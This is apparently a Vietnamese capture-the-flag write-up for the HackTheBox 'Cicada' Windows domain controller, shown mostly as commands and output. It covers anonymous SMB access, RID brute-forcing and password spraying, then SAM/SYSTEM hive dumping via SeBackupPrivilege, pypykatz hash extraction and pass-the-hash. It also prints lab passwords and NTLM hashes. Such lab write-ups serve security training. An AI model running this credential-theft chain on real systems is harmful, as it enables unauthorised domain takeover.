![image](https://hackmd.io/_uploads/rJtiy8h0A.png)

# Machine info and Comment
## Machine info
Đây là một máy đang active nên chưa có thông tin về máy này [Link](https://app.hackthebox.com/machines/Cicada)

## Comment
Máy này thuần khai thác máy chủ smb, ldap và một vài kỹ thuật đi cùng nên được xếp vào máy dễ. Write up này tác giả đang muốn đi ngủ nên chỉ nói kỹ thuật khai thác và không đi sâu :))

# Recon
## nmap 
```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -n -sS 10.10.11.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 09:17 EDT
Nmap scan report for 10.10.11.35
Host is up (0.25s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 12.77 seconds
```
Đào sâu hơn ta được các cổng đáng chú ý đó là smb (445), ldap (389,636)
```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -p53,88,135,139,389,445,464,93,636,3268,3269 -sCV 10.10.11.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 09:22 EDT
Nmap scan report for 10.10.11.35
Host is up (0.24s latency).

PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-03 20:22:18Z)
93/tcp   filtered dcp
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
636/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-03T20:23:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.58 seconds
```

## smbclient
Sử dụng **smbclient** ta thấy có hai share folder `HR` và `DEV`. Thử truy cập vào thì `HR` có thể sử dụng account `anonymous` để truy cập vào
```
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N -L //10.10.11.35 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
File `Notice from HR.txt` cho ta thông tin password
```
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient //10.10.11.35/HR
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> LS
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

                4168447 blocks of size 4096. 325670 blocks available
```
Nội dung tóm lại là lấy được password: `Cicada$M6Corpb*@Lp#nZp!8`
```
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> !ls
 cacida  'Notice from HR.txt'
smb: \> !cat 'Notice from HR.txt'

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
Về phần khai brute-force username từ password có được mình sẽ để ở mục [User Flag](#User-flag)

# User flag
## crackmapexec
Sử dụng crackmapexec với option `--rid-brute`  tìm kiếm các RIDs của người dùng hoặc nhóm, từ đó có thể xác định được các tài khoản người dùng hiện có trong hệ thống.
```
┌──(kali㉿kali)-[~/Downloads/HTB_machines]
└─$ crackmapexec smb 10.10.11.35 -u anonymous -p '' --rid-brute > rid.txt

┌──(kali㉿kali)-[~/Downloads/HTB_machines]
└─$ cat rid.txt | grep SidTypeUser | awk '{print $6}' | awk -F\\ '{print $2}' > users-cicada.txt
```
Sử dụng wordlist này để brute-force account với password khi [Recon](#Recon) được 

```
┌──(kali㉿kali)-[~/Downloads/HTB_machines]
└─$ crackmapexec smb 10.10.11.35 -u users-cicada.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'              
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 

```
Vậy có được `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

## ldapdomaindump
Sử dụng `ldapdomaindump` sẽ thu thập và xuất thông tin từ Active Directory, bao gồm danh sách người dùng, nhóm và thuộc tính khác của các đối tượng trong miền
```
┌──(kali㉿kali)-[~/Downloads/HTB_machines]
└─$ ldapdomaindump ldap://cicada.htb -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
Ta có được các file khi dump ra, mở file ở định dạng `.html` để có giao diện dễ nhìn. Đồng thời ta phát hiện thấy password thứ 2 của `david.orelious`

![image](https://hackmd.io/_uploads/BkFn4L2A0.png)

Ở mục [Recon](#smbclient) ở trên, ta có share folder `DEV` chưa có quyền để đọc nên ta sẽ sử dụng credential vừa tìm đươc để xem nó `david.orelious:aRt$Lp#7t*VQ!3`, ta thấy 1 file mới, sau đó đọc file này ta lại được thêm credential thứ 3

```
┌──(kali㉿kali)-[~/Downloads/HTB_machines/cacida]
└─$ smbclient //10.10.11.35/DEV -U david.orelious
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> !cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
`emily.oscars:Q!3@Lp#M6b*7t*Vt`

## evil-winrm
Với credential trên ta sẽ truy cập vào được máy và lấy được user flag
```
┌──(kali㉿kali)-[~/Downloads/HTB_machines/cacida]
└─$ evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

<SNIP>
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Des type user.txt
180f476a28fdb44a4*******
```

# Root flag
## whoami /priv
Sử dụng `whoami /priv` mình thấy có có 1 quyền là `SeBackupPrivilege` có thể khai thác được qua [bài viết này](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) 
```
PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
## Windows Privilege Escalation: SeBackupPrivilege
```
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```
![image](https://hackmd.io/_uploads/r18aLU2C0.png)

![image](https://hackmd.io/_uploads/rkhRILn00.png)

```
cd Temp
download sam
download system
```

## pypykatz 
`pypykatz` sẽ lấy thông tin từ tệp **SAM** và tệp **SYSTEM** để thu thập thông tin về credential người dùng dưới dạng hash
```
┌──(root㉿kali)-[/home/kali/Downloads/HTB_machines]
└─# pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
## Pass the hash with evil-winrm
Sử dụng kỹ thuật Pass the hash cùng với `evil-winrm` có hỗ trợ ta lấy được root flag
```
┌──(root㉿kali)-[/home/kali/Downloads/HTB_machines]
└─# evil-winrm -i 10.10.11.35 -u administrator -H '2b87e7c93a3e8a0ea4a581937016f341'

<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
5844fad3500efcbc92*****
```

![image](https://hackmd.io/_uploads/Hyh32IhRR.png)

